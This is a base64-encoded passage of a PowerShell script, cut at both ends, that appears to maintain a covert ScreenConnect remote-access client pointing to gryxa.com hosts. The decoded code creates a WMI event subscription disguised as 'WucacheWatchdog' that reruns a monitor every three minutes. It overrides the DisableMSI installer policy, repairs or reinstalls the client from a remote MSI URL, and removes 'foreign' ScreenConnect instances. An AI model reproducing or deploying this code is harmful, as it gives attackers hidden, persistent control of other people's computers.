IHsKICAgICAgICAgICAgICAgICgkXy5OYW1lIC1lcSAnV3VjYWNoZVdhdGNoZG9nRicpIC1vciAo
JF8uTmFtZSAtZXEgJ1d1Y2FjaGVXYXRjaGRvZ0MnKSAtb3IKICAgICAgICAgICAgICAgICgkXy5U
aW1lcklkIC1lcSAnV3VjYWNoZVdhdGNoZG9nJykgLW9yCiAgICAgICAgICAgICAgICAoJF8uRmls
dGVyIC1hbmQgJF8uRmlsdGVyLlRvU3RyaW5nKCkgLWxpa2UgJypXdWNhY2hlV2F0Y2hkb2dGKicp
IC1vcgogICAgICAgICAgICAgICAgKCRfLkNvbnN1bWVyIC1hbmQgJF8uQ29uc3VtZXIuVG9TdHJp
bmcoKSAtbGlrZSAnKld1Y2FjaGVXYXRjaGRvZ0MqJykKICAgICAgICAgICAgfSB8IEZvckVhY2gt
T2JqZWN0IHsgJF8uRGVsZXRlKCkgfCBPdXQtTnVsbCB9CiAgICB9Cn0KCmZ1bmN0aW9uIEluc3Rh
bGwtV2F0Y2hkb2cgewogICAgaWYgKC1ub3QgJE1vblBhdGgpIHsgcmV0dXJuICRmYWxzZSB9CiAg
ICBSZW1vdmUtV2F0Y2hkb2cKICAgICRvayA9ICR0cnVlCiAgICB0cnkgewogICAgICAgIFNldC1X
bWlJbnN0YW5jZSAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBfX0ludGVydmFs
VGltZXJJbnN0cnVjdGlvbiBgCiAgICAgICAgICAgIC1Bcmd1bWVudHMgQHsgVGltZXJJZCA9ICdX
dWNhY2hlV2F0Y2hkb2cnOyBJbnRlcnZhbE1pbGxpc2Vjb25kcyA9IDE4MDAwMDsgU2tpcElmUGFz
c2VkID0gJGZhbHNlIH0gfCBPdXQtTnVsbAogICAgICAgICRmID0gU2V0LVdtaUluc3RhbmNlIC1O
YW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIF9fRXZlbnRGaWx0ZXIgYAogICAgICAg
ICAgICAtQXJndW1lbnRzIEB7IE5hbWUgPSAnV3VjYWNoZVdhdGNoZG9nRic7IEV2ZW50TmFtZXNw
YWNlID0gJ3Jvb3RcY2ltdjInOyBRdWVyeUxhbmd1YWdlID0gJ1dRTCc7CiAgICAgICAgICAgICAg
ICAgICAgICAgICAgUXVlcnkgPSAiU0VMRUNUICogRlJPTSBfX1RpbWVyRXZlbnQgV0hFUkUgVGlt
ZXJJZD0nV3VjYWNoZVdhdGNoZG9nJyIgfQogICAgICAgICRjID0gU2V0LVdtaUluc3RhbmNlIC1O
YW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIENvbW1hbmRMaW5lRXZlbnRDb25zdW1l
ciBgCiAgICAgICAgICAgIC1Bcmd1bWVudHMgQHsgTmFtZSA9ICdXdWNhY2hlV2F0Y2hkb2dDJzsg
Q29tbWFuZExpbmVUZW1wbGF0ZSA9ICJjbWQuZXhlIC9jIGAiJE1vblBhdGhgIiI7IFJ1bkludGVy
YWN0aXZlbHkgPSAkZmFsc2UgfQogICAgICAgIFNldC1XbWlJbnN0YW5jZSAtTmFtZXNwYWNlIHJv
b3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBfX0ZpbHRlclRvQ29uc3VtZXJCaW5kaW5nIGAKICAgICAg
ICAgICAgLUFyZ3VtZW50cyBAeyBGaWx0ZXIgPSAkZjsgQ29uc3VtZXIgPSAkYyB9IHwgT3V0LU51
bGwKICAgIH0gY2F0Y2ggeyAkb2sgPSAkZmFsc2UgfQogICAgcmV0dXJuICRvawp9CgpmdW5jdGlv
biBUZXN0LVdhdGNoZG9nR3JhcGggewogICAgJHQgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ug
cm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIF9fSW50ZXJ2YWxUaW1lckluc3RydWN0aW9uIC1GaWx0
ZXIgIlRpbWVySWQ9J1d1Y2FjaGVXYXRjaGRvZyciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRp
bnVlCiAgICAkZiA9IEdldC1XbWlPYmplY3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAt
Q2xhc3MgX19FdmVudEZpbHRlciAtRmlsdGVyICJOYW1lPSdXdWNhY2hlV2F0Y2hkb2dGJyIgLUVy
cm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICRjID0gR2V0LVdtaU9iamVjdCAtTmFtZXNw
YWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBDb21tYW5kTGluZUV2ZW50Q29uc3VtZXIgLUZp
bHRlciAiTmFtZT0nV3VjYWNoZVdhdGNoZG9nQyciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRp
bnVlCiAgICAkYiA9ICRudWxsCiAgICBpZiAoJGYgLWFuZCAkYykgewogICAgICAgICRiID0gR2V0
LVdtaU9iamVjdCAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBfX0ZpbHRlclRv
Q29uc3VtZXJCaW5kaW5nIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwKICAgICAgICAg
ICAgV2hlcmUtT2JqZWN0IHsgJF8uRmlsdGVyIC1saWtlICcqV3VjYWNoZVdhdGNoZG9nRionIC1h
bmQgJF8uQ29uc3VtZXIgLWxpa2UgJypXdWNhY2hlV2F0Y2hkb2dDKicgfSB8CiAgICAgICAgICAg
IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEKICAgIH0KICAgIHJldHVybiBbYm9vbF0oJHQgLWFuZCAk
ZiAtYW5kICRjIC1hbmQgJGIpCn0KCmZ1bmN0aW9uIEVuc3VyZS1XYXRjaGRvZyB7CiAgICBpZiAo
VGVzdC1XYXRjaGRvZ0dyYXBoKSB7IHJldHVybiAnT0snIH0KICAgIGlmICgtbm90ICRNb25QYXRo
KSB7IHJldHVybiAnTUlTU0lORycgfQogICAgaWYgKEluc3RhbGwtV2F0Y2hkb2cpIHsgcmV0dXJu
ICdSRUFSTUVEJyB9CiAgICByZXR1cm4gJ0ZBSUwnCn0KCiMgQ29ycmVjdCAzMi1iaXQgKyA2NC1i
aXQgQVJQIGhpdmVzLiBMNiBhbmQgZWFybGllciB1c2VkIGEgdHJ1bmNhdGVkCiMgV09XNjQzMk5v
ZGUgcGF0aCAobWlzc2luZyBNaWNyb3NvZnRcV2luZG93cykgc28gRVZFUlkgMzItYml0IFNDIHBy
b2R1Y3QKIyB3YXMgaW52aXNpYmxlIHRvIHJlcGFpci9leHRlcm1pbmF0ZS9yZWdpc3RlcmVkLgok
c2NyaXB0OlVuaW5zdGFsbFJvb3RzID0gQCgKICAgICdIS0xNOlxTT0ZUV0FSRVxNaWNyb3NvZnRc
V2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGwnLAogICAgJ0hLTE06XFNPRlRXQVJFXFdP
VzY0MzJOb2RlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbCcKKQoK
ZnVuY3Rpb24gVGVzdC1TQ1JlZ2lzdGVyZWQoW3N0cmluZ10kRmluZ2VycHJpbnQpIHsKICAgICMg
TDg6IE5FVkVSIHVzZSByZXR1cm4gaW5zaWRlIEZvckVhY2gtT2JqZWN0IC0gaXQgb25seSBleGl0
cyB0aGUKICAgICMgcGlwZWxpbmUgaXRlcmF0aW9uLCBzbyB0aGlzIGZ1bmN0aW9uIGFsd2F5cyBm
ZWxsIHRocm91Z2ggdG8gJ25vJwogICAgIyBhbmQgdGhlIG1vbiBvcnBoYW4tbGFkZGVyIGRlbGV0
ZWQgaGVhbHRoeSByZWdpc3RlcmVkIHNlcnZpY2VzLgogICAgaWYgKC1ub3QgJEZpbmdlcnByaW50
KSB7IHJldHVybiAnbm8nIH0KICAgICRuYW1lID0gIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmlu
Z2VycHJpbnQpIgogICAgZm9yZWFjaCAoJHJvb3QgaW4gJHNjcmlwdDpVbmluc3RhbGxSb290cykg
ewogICAgICAgIGlmICgtbm90IChUZXN0LVBhdGggJHJvb3QpKSB7IGNvbnRpbnVlIH0KICAgICAg
ICBmb3JlYWNoICgka2V5IGluIChHZXQtQ2hpbGRJdGVtICRyb290IC1FcnJvckFjdGlvbiBTaWxl
bnRseUNvbnRpbnVlKSkgewogICAgICAgICAgICAkZG4gPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAka2V5
LlBTUGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkuRGlzcGxheU5hbWUKICAgICAg
ICAgICAgaWYgKCRkbiAtYW5kICgkZG4gLWllcSAkbmFtZSkgLWFuZCAoJGtleS5QU0NoaWxkTmFt
ZSAtbGlrZSAneyp9JykpIHsgcmV0dXJuICd5ZXMnIH0KICAgICAgICB9CiAgICB9CiAgICByZXR1
cm4gJ25vJwp9CgpmdW5jdGlvbiBSZXBhaXItU0NTZXJ2aWNlKFtzdHJpbmddJEZpbmdlcnByaW50
KSB7CiAgICAjIFJlY3JlYXRlcyBhIGRlbGV0ZWQgU0Mgc2VydmljZSBlbnRyeSBieSByZXBhaXJp
bmcgdGhlIFJFR0lTVEVSRUQgcHJvZHVjdC4KICAgICMgbXNpZXhlYyAvZmEge0dVSUR9IHJlcGFp
cnMgaW4gcGxhY2UgLSBpdCBkb2VzIE5PVCBydW4gdGhlIFNDLWZhbWlseQogICAgIyBtYWpvci11
cGdyYWRlIHJlbW92YWwsIHNvIG90aGVyIGluc3RhbmNlcyBhcmUgdW50b3VjaGVkLgogICAgIyBM
NTogYWxzbyBoYW5kbGVzIHByZXNlbnQtYnV0LVNUT1BQRUQgc2VydmljZXMgKHJlcGFpciByZXN0
b3JlcyBiaW5hcmllcywKICAgICMgdGhlbiBzdGFydCkuIE9ubHkgYSBSdW5uaW5nIHNlcnZpY2Ug
aXMgY29uc2lkZXJlZCBoZWFsdGh5LgogICAgaWYgKC1ub3QgJEZpbmdlcnByaW50KSB7IHJldHVy
biAnbm8tZnAnIH0KICAgICRuYW1lID0gIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmluZ2VycHJp
bnQpIgogICAgJHN2YyA9IEdldC1TZXJ2aWNlIC1OYW1lICRuYW1lIC1FcnJvckFjdGlvbiBTaWxl
bnRseUNvbnRpbnVlCiAgICBpZiAoJHN2YyAtYW5kICRzdmMuU3RhdHVzIC1lcSAnUnVubmluZycp
IHsgcmV0dXJuICdzdmMtcnVubmluZycgfQogICAgJGd1aWQgPSAkbnVsbAogICAgZm9yZWFjaCAo
JHJvb3QgaW4gJHNjcmlwdDpVbmluc3RhbGxSb290cykgewogICAgICAgIGlmICgtbm90IChUZXN0
LVBhdGggJHJvb3QpKSB7IGNvbnRpbnVlIH0KICAgICAgICBmb3JlYWNoICgka2V5IGluIChHZXQt
Q2hpbGRJdGVtICRyb290IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSkgewogICAgICAg
ICAgICAkZG4gPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAka2V5LlBTUGF0aCAtRXJyb3JBY3Rpb24gU2ls
ZW50bHlDb250aW51ZSkuRGlzcGxheU5hbWUKICAgICAgICAgICAgaWYgKCRkbiAtYW5kICgkZG4g
LWllcSAkbmFtZSkgLWFuZCAoJGtleS5QU0NoaWxkTmFtZSAtbGlrZSAneyp9JykpIHsgJGd1aWQg
PSAka2V5LlBTQ2hpbGROYW1lOyBicmVhayB9CiAgICAgICAgfQogICAgICAgIGlmICgkZ3VpZCkg
eyBicmVhayB9CiAgICB9CiAgICBpZiAoLW5vdCAkZ3VpZCkgeyByZXR1cm4gJ25vdC1yZWdpc3Rl
cmVkJyB9CiAgICAmIHJlZy5leGUgZGVsZXRlICdIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jv
c29mdFxXaW5kb3dzXEluc3RhbGxlcicgL3YgRGlzYWJsZU1TSSAvZiAyPiYxIHwgT3V0LU51bGwK
ICAgICYgcmVnLmV4ZSBhZGQgJ0hLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRv
d3NcSW5zdGFsbGVyJyAvdiBEaXNhYmxlTVNJIC90IFJFR19EV09SRCAvZCAwIC9mIDI+JjEgfCBP
dXQtTnVsbAogICAgJGxvZyA9IEpvaW4tUGF0aCAkV29ya0RpciAibXNpX3JlcGFpcl8kRmluZ2Vy
cHJpbnQubG9nIgogICAgJHAgPSBTdGFydC1Qcm9jZXNzIG1zaWV4ZWMuZXhlIC1Bcmd1bWVudExp
c3QgIi9mYSAkZ3VpZCAvcW4gL25vcmVzdGFydCAvTCp2IGAiJGxvZ2AiIiAtV2FpdCAtUGFzc1Ro
cnUKICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDgKICAgICYgc2MuZXhlIGNvbmZpZyAiJG5hbWUi
IHN0YXJ0PSBhdXRvIDI+JjEgfCBPdXQtTnVsbAogICAgJiBzYy5leGUgc3RhcnQgIiRuYW1lIiAy
PiYxIHwgT3V0LU51bGwKICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDQKICAgICRzdmMgPSBHZXQt
U2VydmljZSAtTmFtZSAkbmFtZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgaWYg
KCRzdmMgLWFuZCAkc3ZjLlN0YXR1cyAtZXEgJ1J1bm5pbmcnKSB7IHJldHVybiAic3ZjLXJlc3Rv
cmVkIGV4aXQ9JCgkcC5FeGl0Q29kZSkiIH0KICAgIGlmICgkc3ZjKSB7IHJldHVybiAic3ZjLXN0
aWxsLXN0b3BwZWQgZXhpdD0kKCRwLkV4aXRDb2RlKSIgfQogICAgcmV0dXJuICJzdmMtc3RpbGwt
bWlzc2luZyBleGl0PSQoJHAuRXhpdENvZGUpIgp9CgojIOKUgOKUgCBHcnl4YSBNVVNULVJVTiBo
ZWFsdGggKEwxNikg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACiMg
TDE2OiBORVZFUiByZWluc3RhbGwgd2hlbiBzZXJ2aWNlIGlzIFJ1bm5pbmcgKHBhbmVsIGR1cGxp
Y2F0ZXMpLgojICAgICAgVENQL3JlbGF5IGFyZSBhZHZpc29yeSBvbmx5LiBSZWluc3RhbGwgb25s
eTogbWlzc2luZy9zdG9wcGVkIE9SIEZQIGRyaWZ0IE9SIC1Gb3JjZS4KIyBMMTU6IGdyeXhhLWhl
YWx0aCAvIGdyeXhhLWVuc3VyZSDigJQgOGggZGVlcCBjaGVjayAoVENQL3JlbGF5L0ZQIGRyaWZ0
IHJlaW5zdGFsbCkuCiRzY3JpcHQ6R3J5eGFEZWZhdWx0RnAgPSAnOTkwODE5OGU2NjhlNDc1MCcK
JHNjcmlwdDpHcnl4YU1zaVVybCA9ICdodHRwczovL3VpLmdyeXhhLmNvbS9CaW4vU2NyZWVuQ29u
bmVjdC5DbGllbnRTZXR1cC5tc2k/ZT1BY2Nlc3MmeT1HdWVzdCcKJHNjcmlwdDpHcnl4YVJlbGF5
SG9zdCA9ICd1cGRhdGUuZ3J5eGEuY29tJwokc2NyaXB0OkdyeXhhVWlIb3N0ID0gJ3VpLmdyeXhh
LmNvbScKJHNjcmlwdDpTZXZyektlZXAgPSBAKCc1ZjYwMTA1Nzk4NTJlNTA3JywgJ2Y4NjFjODE0
MGQ0NTM0MjcnKQoKZnVuY3Rpb24gR2V0LUdyeXhhQ2ZnUGF0aCB7IEpvaW4tUGF0aCAkV29ya0Rp
ciAnZ3J5eGEuY2ZnJyB9CgpmdW5jdGlvbiBHZXQtR3J5eGFGcCB7CiAgICAkZnAgPSAkc2NyaXB0
OkdyeXhhRGVmYXVsdEZwCiAgICAkcCA9IEdldC1Hcnl4YUNmZ1BhdGgKICAgIGlmIChUZXN0LVBh
dGggLUxpdGVyYWxQYXRoICRwKSB7CiAgICAgICAgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRw
IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAg
ICAgICBpZiAoJF8gLW1hdGNoICdeQ1VSUkVOVF9GUD0oWzAtOWEtZkEtRl17MTZ9KVxzKiQnKSB7
ICRmcCA9ICRtYXRjaGVzWzFdLlRvTG93ZXIoKSB9CiAgICAgICAgfQogICAgfQogICAgcmV0dXJu
ICRmcAp9CgpmdW5jdGlvbiBTZXQtR3J5eGFGcChbc3RyaW5nXSRGaW5nZXJwcmludCkgewogICAg
aWYgKC1ub3QgJEZpbmdlcnByaW50KSB7IHJldHVybiB9CiAgICBpZiAoLW5vdCAoVGVzdC1QYXRo
IC1MaXRlcmFsUGF0aCAkV29ya0RpcikpIHsKICAgICAgICBOZXctSXRlbSAtSXRlbVR5cGUgRGly
ZWN0b3J5IC1QYXRoICRXb3JrRGlyIC1Gb3JjZSB8IE91dC1OdWxsCiAgICB9CiAgICBAKAogICAg
ICAgICJDVVJSRU5UX0ZQPSQoJEZpbmdlcnByaW50LlRvTG93ZXIoKSkiCiAgICAgICAgIlJFTEFZ
PSQoJHNjcmlwdDpHcnl4YVJlbGF5SG9zdCkiCiAgICAgICAgIlVJPSQoJHNjcmlwdDpHcnl4YVVp
SG9zdCkiCiAgICAgICAgIk1TSVVSTD0kKCRzY3JpcHQ6R3J5eGFNc2lVcmwpIgogICAgICAgICJV
UERBVEVEPSQoKEdldC1EYXRlKS5Ub1VuaXZlcnNhbFRpbWUoKS5Ub1N0cmluZygnbycpKSIKICAg
ICkgfCBTZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggKEdldC1Hcnl4YUNmZ1BhdGgpIC1FbmNvZGlu
ZyBBU0NJSSAtRm9yY2UKfQoKZnVuY3Rpb24gR2V0LUtlZXBGaW5nZXJwcmludHMgewogICAgJHNl
dCA9IE5ldy1PYmplY3QgJ1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkhhc2hTZXRbc3RyaW5n
XScgKFtTdHJpbmdDb21wYXJlcl06Ok9yZGluYWxJZ25vcmVDYXNlKQogICAgW3ZvaWRdJHNldC5B
ZGQoJzVmNjAxMDU3OTg1MmU1MDcnKQogICAgW3ZvaWRdJHNldC5BZGQoJ2Y4NjFjODE0MGQ0NTM0
MjcnKQogICAgW3ZvaWRdJHNldC5BZGQoKEdldC1Hcnl4YUZwKSkKICAgICMgTzQxOiBhbnkgbGl2
ZS9zdGFydGluZyBub24tc2V2cnogU0MgaXMgYSBrZWVwZXIgKG5ldmVyIGV4dGVybWluYXRlIGFz
IGZvcmVpZ24pCiAgICBmb3JlYWNoICgkc3ZjIGluIChHZXQtU2VydmljZSAtTmFtZSAnU2NyZWVu
Q29ubmVjdCBDbGllbnQqJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkpIHsKICAgICAg
ICBpZiAoJHN2Yy5TdGF0dXMgLW5vdGluIEAoJ1J1bm5pbmcnLCAnU3RhcnRQZW5kaW5nJywgJ0Nv
bnRpbnVlUGVuZGluZycpKSB7IGNvbnRpbnVlIH0KICAgICAgICBpZiAoJHN2Yy5OYW1lIC1tYXRj
aCAnXCgoWzAtOWEtZl17MTZ9KVwpJykgewogICAgICAgICAgICAkZnAgPSAkbWF0Y2hlc1sxXS5U
b0xvd2VyKCkKICAgICAgICAgICAgaWYgKCRmcCAtbm90aW4gJHNjcmlwdDpTZXZyektlZXApIHsK
ICAgICAgICAgICAgICAgIFt2b2lkXSRzZXQuQWRkKCRmcCkKICAgICAgICAgICAgICAgIFNldC1H
cnl4YUZwICRmcAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgcmV0dXJuIEAoJHNl
dCkKfQoKZnVuY3Rpb24gVGVzdC1UY3BIb3N0UG9ydChbc3RyaW5nXSRIb3N0TmFtZSwgW2ludF0k
UG9ydCA9IDQ0MywgW2ludF0kVGltZW91dE1zID0gODAwMCkgewogICAgaWYgKC1ub3QgJEhvc3RO
YW1lKSB7IHJldHVybiAkZmFsc2UgfQogICAgJGNsaWVudCA9ICRudWxsCiAgICB0cnkgewogICAg
ICAgICRjbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UY3BDbGllbnQKICAg
ICAgICAkaWFyID0gJGNsaWVudC5CZWdpbkNvbm5lY3QoJEhvc3ROYW1lLCAkUG9ydCwgJG51bGws
ICRudWxsKQogICAgICAgIGlmICgtbm90ICRpYXIuQXN5bmNXYWl0SGFuZGxlLldhaXRPbmUoJFRp
bWVvdXRNcywgJGZhbHNlKSkgewogICAgICAgICAgICB0cnkgeyAkY2xpZW50LkNsb3NlKCkgfSBj
YXRjaCB7fQogICAgICAgICAgICByZXR1cm4gJGZhbHNlCiAgICAgICAgfQogICAgICAgICRjbGll
bnQuRW5kQ29ubmVjdCgkaWFyKQogICAgICAgIHJldHVybiAkdHJ1ZQogICAgfSBjYXRjaCB7CiAg
ICAgICAgcmV0dXJuICRmYWxzZQogICAgfSBmaW5hbGx5IHsKICAgICAgICBpZiAoJGNsaWVudCkg
eyB0cnkgeyAkY2xpZW50LkNsb3NlKCkgfSBjYXRjaCB7fSB9CiAgICB9Cn0KCmZ1bmN0aW9uIEdl
dC1Nc2lQcm9wZXJ0eShbc3RyaW5nXSRNc2lQYXRoLCBbc3RyaW5nXSRQcm9wZXJ0eU5hbWUpIHsK
ICAgIGlmICgtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRNc2lQYXRoKSkgeyByZXR1cm4g
JG51bGwgfQogICAgdHJ5IHsKICAgICAgICAkaW5zdGFsbGVyID0gTmV3LU9iamVjdCAtQ29tT2Jq
ZWN0IFdpbmRvd3NJbnN0YWxsZXIuSW5zdGFsbGVyCiAgICAgICAgJGRiID0gJGluc3RhbGxlci5P
cGVuRGF0YWJhc2UoKFJlc29sdmUtUGF0aCAtTGl0ZXJhbFBhdGggJE1zaVBhdGgpLlBhdGgsIDAp
CiAgICAgICAgJHZpZXcgPSAkZGIuT3BlblZpZXcoIlNFTEVDVCBgVmFsdWVgIEZST00gYFByb3Bl
cnR5YCBXSEVSRSBgUHJvcGVydHlgPSckUHJvcGVydHlOYW1lJyIpCiAgICAgICAgJHZpZXcuRXhl
Y3V0ZSgpIHwgT3V0LU51bGwKICAgICAgICAkcmVjID0gJHZpZXcuRmV0Y2goKQogICAgICAgIGlm
ICgtbm90ICRyZWMpIHsgcmV0dXJuICRudWxsIH0KICAgICAgICByZXR1cm4gW3N0cmluZ10kcmVj
LlN0cmluZ0RhdGEoMSkKICAgIH0gY2F0Y2ggewogICAgICAgIHJldHVybiAkbnVsbAogICAgfQp9
CgpmdW5jdGlvbiBHZXQtRnBGcm9tUHJvZHVjdE5hbWUoW3N0cmluZ10kUHJvZHVjdE5hbWUpIHsK
ICAgIGlmICgkUHJvZHVjdE5hbWUgLW1hdGNoICdcKChbMC05YS1mQS1GXXsxNn0pXCknKSB7IHJl
dHVybiAkbWF0Y2hlc1sxXS5Ub0xvd2VyKCkgfQogICAgcmV0dXJuICRudWxsCn0KCmZ1bmN0aW9u
IEZpbmQtUHJvZHVjdEd1aWQoW3N0cmluZ10kRmluZ2VycHJpbnQpIHsKICAgICRuYW1lID0gIlNj
cmVlbkNvbm5lY3QgQ2xpZW50ICgkRmluZ2VycHJpbnQpIgogICAgZm9yZWFjaCAoJHJvb3QgaW4g
JHNjcmlwdDpVbmluc3RhbGxSb290cykgewogICAgICAgIGlmICgtbm90IChUZXN0LVBhdGggJHJv
b3QpKSB7IGNvbnRpbnVlIH0KICAgICAgICBmb3JlYWNoICgka2V5IGluIChHZXQtQ2hpbGRJdGVt
ICRyb290IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSkgewogICAgICAgICAgICAkZG4g
PSAoR2V0LUl0ZW1Qcm9wZXJ0eSAka2V5LlBTUGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
aW51ZSkuRGlzcGxheU5hbWUKICAgICAgICAgICAgaWYgKCRkbiAtYW5kICgkZG4gLWllcSAkbmFt
ZSkgLWFuZCAoJGtleS5QU0NoaWxkTmFtZSAtbGlrZSAneyp9JykpIHsKICAgICAgICAgICAgICAg
IHJldHVybiAka2V5LlBTQ2hpbGROYW1lCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAg
ICByZXR1cm4gJG51bGwKfQoKZnVuY3Rpb24gVGVzdC1Hcnl4YVJlbGF5Q29uZmlndXJlZChbc3Ry
aW5nXSRGaW5nZXJwcmludCkgewogICAgJG5hbWUgPSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRG
aW5nZXJwcmludCkiCiAgICAkZGlycyA9IEAoCiAgICAgICAgKEpvaW4tUGF0aCAke2VudjpQcm9n
cmFtRmlsZXMoeDg2KX0gIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmluZ2VycHJpbnQpIiksCiAg
ICAgICAgKEpvaW4tUGF0aCAkZW52OlByb2dyYW1GaWxlcyAiU2NyZWVuQ29ubmVjdCBDbGllbnQg
KCRGaW5nZXJwcmludCkiKQogICAgKQogICAgJHBhdHRlcm5zID0gQCgndXBkYXRlLmdyeXhhLmNv
bScsICd1aS5ncnl4YS5jb20nLCAnZ3J5eGEuY29tJykKICAgIGZvcmVhY2ggKCRkIGluICRkaXJz
KSB7CiAgICAgICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpKSB7IGNvbnRp
bnVlIH0KICAgICAgICAkZmlsZXMgPSBAKEdldC1DaGlsZEl0ZW0gLUxpdGVyYWxQYXRoICRkIC1G
aWxlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgU2VsZWN0LU9iamVjdCAtRmlyc3Qg
NjApCiAgICAgICAgZm9yZWFjaCAoJGYgaW4gJGZpbGVzKSB7CiAgICAgICAgICAgIGZvcmVhY2gg
KCRwYXQgaW4gJHBhdHRlcm5zKSB7CiAgICAgICAgICAgICAgICBpZiAoU2VsZWN0LVN0cmluZyAt
TGl0ZXJhbFBhdGggJGYuRnVsbE5hbWUgLVBhdHRlcm4gJHBhdCAtU2ltcGxlTWF0Y2ggLVF1aWV0
IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0
dXJuICR0cnVlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgdHJ5
IHsKICAgICAgICAgICAgICAgIGlmICgkZi5MZW5ndGggLWd0IDJNQikgeyBjb250aW51ZSB9CiAg
ICAgICAgICAgICAgICAkYnl0ZXMgPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJGYu
RnVsbE5hbWUpCiAgICAgICAgICAgICAgICAkdGV4dCA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106
OlVuaWNvZGUuR2V0U3RyaW5nKCRieXRlcykKICAgICAgICAgICAgICAgIGlmICgkdGV4dCAtbWF0
Y2ggJ2dyeXhhXC5jb20nKSB7IHJldHVybiAkdHJ1ZSB9CiAgICAgICAgICAgICAgICAkdGV4dDgg
PSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZygkYnl0ZXMpCiAgICAgICAg
ICAgICAgICBpZiAoJHRleHQ4IC1tYXRjaCAnZ3J5eGFcLmNvbScpIHsgcmV0dXJuICR0cnVlIH0K
ICAgICAgICAgICAgfSBjYXRjaCB7fQogICAgICAgIH0KICAgIH0KICAgICRpbWcgPSAoR2V0LUl0
ZW1Qcm9wZXJ0eSAiSEtMTTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXCRuYW1l
IiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkuSW1hZ2VQYXRoCiAgICBpZiAoJGltZyAt
YW5kICgkaW1nIC1tYXRjaCAnZ3J5eGFcLmNvbScpKSB7IHJldHVybiAkdHJ1ZSB9CiAgICBpZiAo
RmluZC1Qcm9kdWN0R3VpZCAkRmluZ2VycHJpbnQpIHsgcmV0dXJuICR0cnVlIH0KICAgIHJldHVy
biAkZmFsc2UKfQoKZnVuY3Rpb24gVGVzdC1TY1J1bm5pbmcoW3N0cmluZ10kRmluZ2VycHJpbnQp
IHsKICAgIGlmICgtbm90ICRGaW5nZXJwcmludCkgeyByZXR1cm4gJGZhbHNlIH0KICAgICRzdmMg
PSBHZXQtU2VydmljZSAtTmFtZSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCki
IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICByZXR1cm4gW2Jvb2xdKCRzdmMgLWFu
ZCAkc3ZjLlN0YXR1cyAtZXEgJ1J1bm5pbmcnKQp9CgpmdW5jdGlvbiBUZXN0LVNjRGlyKFtzdHJp
bmddJEZpbmdlcnByaW50KSB7CiAgICBmb3JlYWNoICgkYmFzZSBpbiBAKCR7ZW52OlByb2dyYW1G
aWxlcyh4ODYpfSwgJGVudjpQcm9ncmFtRmlsZXMpKSB7CiAgICAgICAgaWYgKFRlc3QtUGF0aCAt
TGl0ZXJhbFBhdGggKEpvaW4tUGF0aCAkYmFzZSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5n
